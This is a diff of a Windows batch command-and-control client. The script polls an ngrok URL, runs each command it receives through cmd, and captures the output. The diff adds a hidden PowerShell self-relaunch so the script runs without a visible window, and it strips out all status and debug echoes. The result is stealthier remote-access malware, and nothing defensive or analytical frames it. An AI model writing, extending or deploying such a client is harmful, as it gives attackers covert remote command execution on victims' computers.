@@ -1,10 +1,12 @@
 @echo off
+if "%1"=="HIDDEN" goto :hidden_main
+powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'HIDDEN' -WindowStyle Hidden"
+exit
+:hidden_main
+
 setlocal enabledelayedexpansion
 set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev
 set LAST_CMD=
-
-echo [*] Starting C2 Client
-echo [*] URL: %URL%
 
 :loop
     timeout /t 3 /nobreak >nul
@@ -15,17 +17,11 @@ echo [*] URL: %URL%
     rem Read first line only
     set /p CMD=<%TEMP%\c2_raw.txt
     
-    echo [DEBUG] Got: !CMD!
-    
     if "!CMD!"=="" goto loop
     if "!CMD!"=="WAITING" goto loop
-    if "!CMD!"=="!LAST_CMD!" (
-        echo [*] Duplicate, skipping
-        goto loop
-    )
+    if "!CMD!"=="!LAST_CMD!" goto loop
     
     set LAST_CMD=!CMD!
-    echo [*] Executing: !CMD!
     
     set TEMPFILE=%TEMP%\c2_output.txt
     cmd /c "!CMD!" > "!TEMPFILE!" 2>&1
